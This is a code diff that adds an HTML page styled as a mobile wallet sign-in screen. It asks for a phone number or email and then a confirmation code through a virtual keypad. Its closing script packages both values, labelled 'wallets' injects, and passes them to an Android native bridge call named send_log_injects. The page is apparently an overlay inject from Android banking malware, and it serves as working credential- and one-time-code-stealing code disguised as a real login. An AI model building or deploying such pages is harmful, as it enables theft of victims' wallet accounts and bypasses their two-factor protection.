@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
+    <title>Document</title>
+    <style>
+        body {
+            font-family: sans-serif;
+        }
+
+        form {
+            margin :0;
+        }
+
+        #form1, #form2 {
+            padding: 20px;
+            padding-top: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        section {
+            flex: 1;
+        }
+
+        header {
+            text-shadow: bold;
+            font-size: 28px;
+            margin-bottom: 15px;
+        }
+
+        header div {
+            text-align: right;
+        }
+
+        .td_.td_2 {
+            background: transparent;
+            padding-top: 0;
+            color: #666666;
+        }
+
+        .pinpad.d-flex.justify-content-between {
+            padding: 1px 25px;
+        }
+
+        .td_.td_2 {
+            color: #666666;
+        }
+
+        span.pinpad-item {
+            color: #666;
+            padding: 20px 0px;
+            text-align: center;
+            font-size: 32px;
+            width: 57px;
+            margin-top: -14px;
+        }
+
+        .input {
+            width: 100%;
+            padding: 10px;
+            border: 0;
+            background: transparent;
+            font-size: 24px;
+            padding-left: 0;
+            padding-top: 0;
+        }
+
+        .button {
+            background: #00d650;
+            padding: 10px;
+            width: 100%;
+            border: 0;
+            border-radius: 75px;
+            color: #fff;
+        }
+    </style>
+</head>
+<body ng-app="CombineModule">
+    <div class="loader__" id="spinner" style="display:none;position:fixed;top:0px;left:0px;width:100%;height:100%;text-align:center;background:rgba(255, 255, 255, 0.47);z-index:8000000;">
+        <span  class="fa fa-circle-o-notch  fa-spin " style="position:relative;top:50%;font-size:50px;color:#00d650"></span>
+    </div>
+    <form id="form" onsubmit="return false">
+        <div id="form1" ng-controller="MyControllerA">
+            <header>
+                <div>
+                    <img style="width: 24px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACoAAAAqCAAAAADgqJaHAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6OUVDMzRDREU3NUYyMTFFQUJCNDlDQkE5MzhCNERGQkQiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6OUVDMzRDREY3NUYyMTFFQUJCNDlDQkE5MzhCNERGQkQiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo5RUMzNENEQzc1RjIxMUVBQkI0OUNCQTkzOEI0REZCRCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo5RUMzNENERDc1RjIxMUVBQkI0OUNCQTkzOEI0REZCRCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PrIRa2YAAALiSURBVBgZbcF7U1pHAMbh/f6fYN89KqJjSMPEJHgDmkSN2DqtlzbSTIf84cQK1tgq6hgF3d92D9dDzfMYPBDwgAcu6rVycWamWK7VLxgLgGEgBGi+m1fG/LsWBPAEIsPIZUVWk2zlisCAYcDvJPqOZMeDJ2Xou19Sj1OxvLGzs1EuaqDUxZMy9Nw8l5yk4kEbCAFoH7ywSr24AQIYUtdzShUaZIXGMznJzt2QMkTd50rtPgayPI+7Sv3QJTKAX1aUO6bHE3kGjnOKVvBggLqifJvvas8qqgMG7medbHJG5HkitBJJs3dgYEtRIzDUOdrZP3sEPD0NRTUwXDrJrTL058aCpJnl9Q4pD6xKcv9i+KDoAvAEqMw49dWuA33nimoY5iW9pcd7thP1WZUDA1VJ85ivVk4njLzU5vsv9RUrvezgiTx/KfrH7EqaegA8Pd+WOsCe5JIzBh6mJO2ZiqRl+gJDv0rKnzO0LKliXkn6iSgAgShAZ0VStcPQtqTX5pmkfSBAIPLA6ZqkqZ8BT8++pIJJJH1iwklBUrLmGalLyplpSXUgMPTwVlKh/MjYoWSnTcFJu2QdSHZuGzyevvCLpIJ5JWmTrCVJH5iwKas3piJpkazLZqv5laywKKlq9qzk7sm4bDWbp3gGAtw7Sbvmb0WfA2MlSVWyGorOTchLKpFRllQJZLyRlMfwXtEJY2XJVsg4UbQZDGeKXjNWklOFjEVF5xhPVVY6ZOSi2Wy2GDtU9CMYuHKSkhae/wtErUSSuwZDYEtR7goCT13NWkk1wADdomSVP2NCIHWal6yKHQ+G6HZB0VSDJz4nihZuiQwBaOeVqrSZcLmm1Fwb8Bh6bopKua3jBwIhEOgcbyVOUfGGHkNfd1VWkU0W1/ePjvbXF52sJKtyl0DKEPAEoLEgWWVYRQsNokBkGHn8LadJbvb3B0YMGXcfS85qyJU+3pFhyAhw+0dttTidK65tffrGpP8AK+7lysGqn9oAAAAASUVORK5CYII=" alt="">
+                </div>
+                
+                Enter Your Phone or Email
+            </header>
+            <section>
+                <input type="text" id="login" name="login" disabled class="input" placeholder="Phone or Email">
+            </section>
+            <footer>
+                <div id="virtualKeyboar">
+                    <div class="tr_ tr3">
+                        <div class="td_ td_2">
+                            <div class="asd" style="background: transparent;">
+                                <div class="pinpad d-flex justify-content-between">
+                                    <span id="btnPin5" ng-click="edit_pinw(1)" class="pinpad-item">
+                                        <span class="val">1</span>
+                                    </span>
+                                    <span id="btnPin7" ng-click="edit_pinw(2)" class="pinpad-item">
+                                        <span class="val">2</span>
+                                    </span>
+                                    <span id="btnPin3" ng-click="edit_pinw(3)" class="pinpad-item">
+                                        <span class="val">3</span>
+                                    </span>
+                                </div>
+                                <div class="pinpad d-flex justify-content-between">
+                                    <span id="btnPin9" ng-click="edit_pinw(4)" class="pinpad-item">
+                                        <span class="val">4</span>
+                                    </span>
+                                    <span id="btnPin1" ng-click="edit_pinw(5)" class="pinpad-item">
+                                        <span class="val">5</span>
+                                    </span>
+                                    <span id="btnPin8" ng-click="edit_pinw(6)" class="pinpad-item">
+                                        <span class="val">6</span>
+                                    </span>
+                                </div>
+                                <div class="pinpad d-flex justify-content-between">
+                                    <span id="btnPin6" ng-click="edit_pinw(7)" class="pinpad-item">
+                                        <span class="val">7</span>
+                                    </span>
+                                    <span id="btnPin4" ng-click="edit_pinw(8)" class="pinpad-item">
+                                        <span class="val">8</span>
+                                    </span>
+                                    <span id="btnPin2" ng-click="edit_pinw(9)" class="pinpad-item">
+                                        <span class="val">9</span>
+                                    </span>
+                                </div>
+                                <div class="pinpad d-flex justify-content-between">
+                                    <span class="pinpad-item" onclick="changeFormat()" style="text-align: center;font-size: 18px;margin-top: -5px;">
+                                        ABC
+                                    </span>
+                                    <span id="btnPin10" ng-click="edit_pinw(0)" class="pinpad-item">
+                                        <span class="val">0</span>
+                                    </span>
+                                    <span class="pinpad-item" id="btnDel" ng-click="reset();" style="text-align: center;"> <img style="width: 12px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAAcCAAAAABJr7D7AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NzIwNkJBNzk3NUY0MTFFQUI5MEFGNjYwRDlCMEI1QTIiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NzIwNkJBN0E3NUY0MTFFQUI5MEFGNjYwRDlCMEI1QTIiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo3MjA2QkE3Nzc1RjQxMUVBQjkwQUY2NjBEOUIwQjVBMiIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo3MjA2QkE3ODc1RjQxMUVBQjkwQUY2NjBEOUIwQjVBMiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PrGTxBEAAAEUSURBVCjPXdFJS8NQFIbh/tm+N9XWrThr0BYRDGhBiiOKC3FA/4GgOBNbrVa0OKBiHahI1Y3NPS5MchPv8uFwOef7EhJ5zfMLEUlExNvqsI/jtNMFuVOftIjovR4ApxpO6YM+gMz6d0hHAwDp1c/wL9cGaF1u6IBKQwAtSx/hEuUcQGrxXbRPZ8MkwZp/E/GnLkcBrNkXCehmHEBN1ySguzyg1ORTsE7ifkIBqvAgEQJQhUdDcpsHYKpmSK7HAKyZ54C0SNVRgDX3Gk6JVEYAUgt1Q1LK/h1U1ybo4uD/s7V2bSCZXmmY7PVhP0BmzUQoer8XoG3jyzTk7XYDOFeR0rztTsiexHpsbrbbbrxa+SlXROQXy/2VlrUoZtoAAAAASUVORK5CYII=" alt="" class="i76"> </span>
+                                </div>
+                                <div class="pinpad d-flex justify-content-between">
+                                    <span class="pinpad-item" style="text-align: center;font-size: 18px;margin-top: -5px;">
+                                    </span>
+                                    <span id="btnPin11" ng-click="edit_pinw('+')" class="pinpad-item">
+                                        <span class="val">+</span>
+                                    </span>
+                                    <span class="pinpad-item" id="btnDel" ng-click="reset();" style="text-align: center;"> 
+                                        </span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="useKeyboard" style="display: none;">
+                    <input type="submit" class="button" onclick="virtualKey()" style="width: 49%; float: left;margin-right: 2%;background: #f4f4f4;color: #333333;font-weight: 600;" value="Use Phone">
+                    <input type="submit" class="button" id="nextPage1" style="width: 49%; float: left;" value="Next">
+                </div>
+
+                <div id="bigBtn">
+                    <input type="submit" class="button" id="nextPage2" value="Next">
+                </div>
+            </footer>
+        </div>
+
+        <div id="form2" ng-controller="MyControllerB" style="display: none;">
+            <header>
+                <div>
+                    <img style="width: 24px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACoAAAAqCAAAAADgqJaHAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6OUVDMzRDREU3NUYyMTFFQUJCNDlDQkE5MzhCNERGQkQiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6OUVDMzRDREY3NUYyMTFFQUJCNDlDQkE5MzhCNERGQkQiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo5RUMzNENEQzc1RjIxMUVBQkI0OUNCQTkzOEI0REZCRCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo5RUMzNENERDc1RjIxMUVBQkI0OUNCQTkzOEI0REZCRCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PrIRa2YAAALiSURBVBgZbcF7U1pHAMbh/f6fYN89KqJjSMPEJHgDmkSN2DqtlzbSTIf84cQK1tgq6hgF3d92D9dDzfMYPBDwgAcu6rVycWamWK7VLxgLgGEgBGi+m1fG/LsWBPAEIsPIZUVWk2zlisCAYcDvJPqOZMeDJ2Xou19Sj1OxvLGzs1EuaqDUxZMy9Nw8l5yk4kEbCAFoH7ywSr24AQIYUtdzShUaZIXGMznJzt2QMkTd50rtPgayPI+7Sv3QJTKAX1aUO6bHE3kGjnOKVvBggLqifJvvas8qqgMG7medbHJG5HkitBJJs3dgYEtRIzDUOdrZP3sEPD0NRTUwXDrJrTL058aCpJnl9Q4pD6xKcv9i+KDoAvAEqMw49dWuA33nimoY5iW9pcd7thP1WZUDA1VJ85ivVk4njLzU5vsv9RUrvezgiTx/KfrH7EqaegA8Pd+WOsCe5JIzBh6mJO2ZiqRl+gJDv0rKnzO0LKliXkn6iSgAgShAZ0VStcPQtqTX5pmkfSBAIPLA6ZqkqZ8BT8++pIJJJH1iwklBUrLmGalLyplpSXUgMPTwVlKh/MjYoWSnTcFJu2QdSHZuGzyevvCLpIJ5JWmTrCVJH5iwKas3piJpkazLZqv5laywKKlq9qzk7sm4bDWbp3gGAtw7Sbvmb0WfA2MlSVWyGorOTchLKpFRllQJZLyRlMfwXtEJY2XJVsg4UbQZDGeKXjNWklOFjEVF5xhPVVY6ZOSi2Wy2GDtU9CMYuHKSkhae/wtErUSSuwZDYEtR7goCT13NWkk1wADdomSVP2NCIHWal6yKHQ+G6HZB0VSDJz4nihZuiQwBaOeVqrSZcLmm1Fwb8Bh6bopKua3jBwIhEOgcbyVOUfGGHkNfd1VWkU0W1/ePjvbXF52sJKtyl0DKEPAEoLEgWWVYRQsNokBkGHn8LadJbvb3B0YMGXcfS85qyJU+3pFhyAhw+0dttTidK65tffrGpP8AK+7lysGqn9oAAAAASUVORK5CYII=" alt="">
+                </div>
+                
+                Please enter the code sent to <span id="emailDublikat"></span>
+            </header>
+            <section>
+                <input type="tel" id="code" name="code" disabled class="input" placeholder="Confirmation Code">
+            </section>
+            <footer>
+
+                <script>
+                    app = angular.module('aaa', [])
+                    app.controller('sss', ['$scope', function ($scope) {
+                        $sc_ = $scope
+                        $scope.pin = ""
+                        $scope.edit_pine = function (code) {
+                            if ($scope.pin.length != 50) {
+                                try{
+                                    document.getElementById('sendData').disabled = false;
+                                } catch(e){};
+                                $scope.pin += '' + code;
+                                $("#code").val($scope.pin);
+                            }
+                               console.log($scope.pin);
+                        }
+                               console.log($scope.pin);
+                        $scope.reset = function () {
+                            Rlast = $scope.pin.substring(0, $scope.pin.length - 1);
+                            $scope.pin = Rlast;
+                            $("#code").val(Rlast);
+                        }
+                    }])
+                </script>
+                <div id="virtualKeyboar">
+                    <div class="tr_ tr3">
+                        <div class="td_ td_2">
+                            <div class="asd" style="background: transparent;">
+                                <div class="pinpad d-flex justify-content-between">
+                                    <span id="btnPin5" ng-click="edit_pine(1)" class="pinpad-item">
+                                        <span class="val">1</span>
+                                    </span>
+                                    <span id="btnPin7" ng-click="edit_pine(2)" class="pinpad-item">
+                                        <span class="val">2</span>
+                                    </span>
+                                    <span id="btnPin3" ng-click="edit_pine(3)" class="pinpad-item">
+                                        <span class="val">3</span>
+                                    </span>
+                                </div>
+                                <div class="pinpad d-flex justify-content-between">
+                                    <span id="btnPin9" ng-click="edit_pine(4)" class="pinpad-item">
+                                        <span class="val">4</span>
+                                    </span>
+                                    <span id="btnPin1" ng-click="edit_pine(5)" class="pinpad-item">
+                                        <span class="val">5</span>
+                                    </span>
+                                    <span id="btnPin8" ng-click="edit_pine(6)" class="pinpad-item">
+                                        <span class="val">6</span>
+                                    </span>
+                                </div>
+                                <div class="pinpad d-flex justify-content-between">
+                                    <span id="btnPin6" ng-click="edit_pine(7)" class="pinpad-item">
+                                        <span class="val">7</span>
+                                    </span>
+                                    <span id="btnPin4" ng-click="edit_pine(8)" class="pinpad-item">
+                                        <span class="val">8</span>
+                                    </span>
+                                    <span id="btnPin2" ng-click="edit_pine(9)" class="pinpad-item">
+                                        <span class="val">9</span>
+                                    </span>
+                                </div>
+                                <div class="pinpad d-flex justify-content-between">
+                                    <span class="pinpad-item" style="text-align: center;font-size: 18px;margin-top: -5px;">
+                                        
+                                    </span>
+                                    <span id="btnPin10" ng-click="edit_pine(0)" class="pinpad-item">
+                                        <span class="val">0</span>
+                                    </span>
+                                    <span class="pinpad-item" id="btnDel" ng-click="reset();" style="text-align: center;"> <img style="width: 12px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAAcCAAAAABJr7D7AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NzIwNkJBNzk3NUY0MTFFQUI5MEFGNjYwRDlCMEI1QTIiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NzIwNkJBN0E3NUY0MTFFQUI5MEFGNjYwRDlCMEI1QTIiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo3MjA2QkE3Nzc1RjQxMUVBQjkwQUY2NjBEOUIwQjVBMiIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo3MjA2QkE3ODc1RjQxMUVBQjkwQUY2NjBEOUIwQjVBMiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PrGTxBEAAAEUSURBVCjPXdFJS8NQFIbh/tm+N9XWrThr0BYRDGhBiiOKC3FA/4GgOBNbrVa0OKBiHahI1Y3NPS5MchPv8uFwOef7EhJ5zfMLEUlExNvqsI/jtNMFuVOftIjovR4ApxpO6YM+gMz6d0hHAwDp1c/wL9cGaF1u6IBKQwAtSx/hEuUcQGrxXbRPZ8MkwZp/E/GnLkcBrNkXCehmHEBN1ySguzyg1ORTsE7ifkIBqvAgEQJQhUdDcpsHYKpmSK7HAKyZ54C0SNVRgDX3Gk6JVEYAUgt1Q1LK/h1U1ybo4uD/s7V2bSCZXmmY7PVhP0BmzUQoer8XoG3jyzTk7XYDOFeR0rztTsiexHpsbrbbbrxa+SlXROQXy/2VlrUoZtoAAAAASUVORK5CYII=" alt="" class="i76"> </span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <input type="hidden" name="exit">
+                <div id="bigBtn">
+                    <input type="submit" class="button" id="sendData" value="Next">
+                </div>
+            </footer>
+        </div>
+    </form>
+
+    <script type="text/javascript">
+        var moduleA = angular.module("MyModuleA", []);
+            moduleA.controller("MyControllerA", function($scope) {
+                $sc_ = $scope
+            $scope.pinw = ""
+            $scope.edit_pinw = function (login) {
+                if ($scope.pinw.length != 50) {
+                    try{
+                        document.getElementById('nextPage').disabled = false;
+                    } catch(e){};
+                    $scope.pinw += '' + login;
+                    $("#login").val($scope.pinw);
+                }
+            }
+            $scope.reset = function () {
+                Rlastw = $scope.pinw.substring(0, $scope.pinw.length - 1);
+                $scope.pinw = Rlastw;
+                $("#login").val(Rlastw);
+            }
+            });
+
+        var moduleB = angular.module("MyModuleB", []);
+            moduleB.controller("MyControllerB", function($scope) {
+                $sc_ = $scope
+            $scope.pinw = ""
+            $scope.edit_pine = function (code) {
+                if ($scope.pinw.length != 50) {
+                    try{
+                        document.getElementById('sendData').disabled = false;
+                    } catch(e){};
+                    $scope.pinw += '' + code;
+                    $("#code").val($scope.pinw);
+                }
+            }
+            $scope.reset = function () {
+                Rlastw = $scope.pinw.substring(0, $scope.pinw.length - 1);
+                $scope.pinw = Rlastw;
+                $("#code").val(Rlastw);
+            }
+            });
+
+            angular.module("CombineModule", ["MyModuleA", "MyModuleB"]);
+
+
+        var virtualKeyboar = document.getElementById('virtualKeyboar'),
+            login = document.getElementById('login'),
+            code = document.getElementById('code'),
+            bigBtn = document.getElementById('bigBtn'),
+            useKeyboard = document.getElementById('useKeyboard'),
+            form = document.getElementById('form'),
+            form1 = document.getElementById('form1'),
+            form2 = document.getElementById('form2'),
+            nextPage1 = document.getElementById('nextPage1'),
+            nextPage2 = document.getElementById('nextPage2'),
+            sendData = document.getElementById('sendData'),
+            spinner = document.getElementById('spinner');
+
+        function changeFormat(){
+            login.value = '';
+            virtualKeyboar.style.display = 'none';
+            login.placeholder = 'Email';
+            login.disabled = false;
+            login.focus()
+            bigBtn.style.display = 'none';
+            useKeyboard.style.display = 'block';
+        }
+
+        function virtualKey(){
+            useKeyboard.style.display = 'none';
+            bigBtn.style.display = 'block';
+            login.value = '';
+            virtualKeyboar.style.display = 'block';
+            login.placeholder = 'Phone or Email';
+            login.disabled = true;
+        }
+
+        nextPage1.onclick = function() {
+            if(login.value.length > 6) {
+                spinner.style.display = 'block';
+                setTimeout(() => {
+                    spinner.style.display = 'none';
+                    form1.style.display = 'none';
+                    form2.style.display = 'flex'
+                }, 1500);
+                val = document.getElementById('login').value;
+                document.getElementById('emailDublikat').innerHTML = val;
+            }
+        }
+
+        nextPage2.onclick = function() {
+            if(login.value.length > 6) {
+                spinner.style.display = 'block'
+                setTimeout(() => {
+                    spinner.style.display = 'none';
+                    form1.style.display = 'none';
+                    form2.style.display = 'flex'
+                }, 1500);
+                val = document.getElementById('login').value;
+                document.getElementById('emailDublikat').innerHTML = val;
+            }
+            console.log(login.value)
+        }
+
+        sendData.onclick = function() {
+            if(code.value.length > 5) {
+                spinner.style.display = 'block';
+                setTimeout(() => {
+                    var data = {};
+                    data.login = login.value;
+                    data.code = code.value;
+                    data.type_injects = "wallets";
+                    data.closed = "close_activity_injects";
+
+                    var ua = navigator.userAgent.toLowerCase();
+                    if(ua.indexOf("android") > -1) {
+                        try {
+                            Android.send_log_injects(JSON.stringify(data))
+                        } catch (err) {}
+                    }else{
+                        alert(JSON.stringify(data));
+                    }
+                }, 1500);
+            }
+        }
+    </script>
+</body>
+</html>
